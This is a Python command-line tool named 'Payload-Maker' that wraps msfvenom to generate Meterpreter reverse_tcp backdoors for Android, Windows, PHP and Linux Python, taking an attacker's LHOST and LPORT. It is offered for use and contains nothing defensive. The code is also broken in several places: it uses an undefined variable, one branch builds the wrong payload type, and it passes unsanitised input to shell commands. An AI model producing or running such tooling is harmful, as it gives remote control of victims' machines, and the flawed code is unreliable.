import sys
import os
import time
def platform1():
    platforms = {
        'linux1' : 'Linux',
        'linux2' : 'Linux',
        'darwin' : 'OS X',
        'win32' : 'Windows'
    }
    if sys.platform not in platforms:
        return sys.platform
    
    return platforms[sys.platform]
if platform1()== "Linux":
	pass
else:
	print("This software is only for Linux os sorry")
	sys.exit()
if sys.version_info.major < 3:
	print("Payload Maker supports only Python3. Rerun application in Python3 environment.")
	install = input("you want to install Python3? [yes / no] : ")
	if install.lower()=="yes" or install.lower()=="y":
		os.system("sudo apt update && sudo apt-get install python")
	else:
		sys.exit()
		print("Program Exiting.......")
		time.sleep(1)
		sys.exit()
else:
	pass
option=["1","2","3","4","99","exit"]
def payload():
	print("(1)Make Paylaod for Android.")
	print("(2)Make Payload for Windows.")
	print("(3)Make PHP Payload.")
	print("(4)Make Python Payload for Linux.")
	print("(99)Exit.")
	while True:
		platform=input("Answer : ")
		if platform =="99" or platform.lower()=="exit":
    			print("Program Exiting.......")
    			time.sleep(1)
    			sys.exit()
		elif platform in option:
			break
		else:
			print(f"Error : {platform} not found. \nPlease type correct option.")
			continue
	os.system("ifconfig")
	lhost=""
	while True:
		lhost=input("Type your localhost show in display i.e 192.168.10.1 : ")
		if lhost:
 				break 
		else:
    			print("Please type your LHOST(LocalHost) which show in display.")
    			continue
	while True:
    		lport=input("Type localport i.e 4444 : ")
    		if lport:
    				break
    		else:
    				print("Please type your LPORT(LocalPort).")
    				continue
	while True:
			name=input("Type the name of your payload i.e payload.apk/.exe/.php/.py : ")
			if name:
    				break
			else:
    				print("Please type the name of your Payload(BackDoor).")
    				continue
	while True:
    		location=input("Type location of your payload i.e /root/Desktop.. : ")
    		if location:
    				if "/" in location or "\\" in location:
    						break
    				else:
    						print(f"Error:{location} not found.\nPlease type correct location.")
    		else:
    				loaction = "/root/Desktop/"
    				print("Your did not type any thing in the place of loacation.\nThat's Your payload save in your Desktop.")
    				break
	if platform=="1":
			if ".apk" not in name:
					name=name+".apk"
					loaction = loaction+name
					print("Creating payload.........")
					os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
			else:
    				print("Creating payload.........")
    				loaction = loaction+name
    				os.system(f"msfvenom -p php/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
	elif platform=="2":
			if ".exe" not in name:
					name=name+".exe"
					loaction = loaction+name
					print("Creating payload.........")
					os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
			else:
					name=name
					loaction = loaction+name
					os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
					print("Creating payload.........")
	elif platform=="3":
			if ".php" not in name:
					name=name+".php"
					loaction = loaction+name
					os.system(f"msfvenom -p php/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
			else:
    				loaction = loaction+name
    				print("Creating payload.........")
    				os.system(f"msfvenom -p php/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
	elif platform=="4":
			if ".py" not in name:
    				name=name+".py"
    				loaction = loaction+name
    				print("Creating payload.........")
    				os.system(f"msfvenom -p python/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
			else:
    				loaction = loaction+name
    				print("Creating payload.........")
    				os.system(f"msfvenom -p python/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {location}")
	elif platform=="99" or platform == "exit" :
				sys.exit()
try:		
	print("""
##################################
#         Payload-Maker          #
#       Author: Moin Khan        #
##################################
					""")
	payload()	
		
except Exception as e:
	print(e)
	

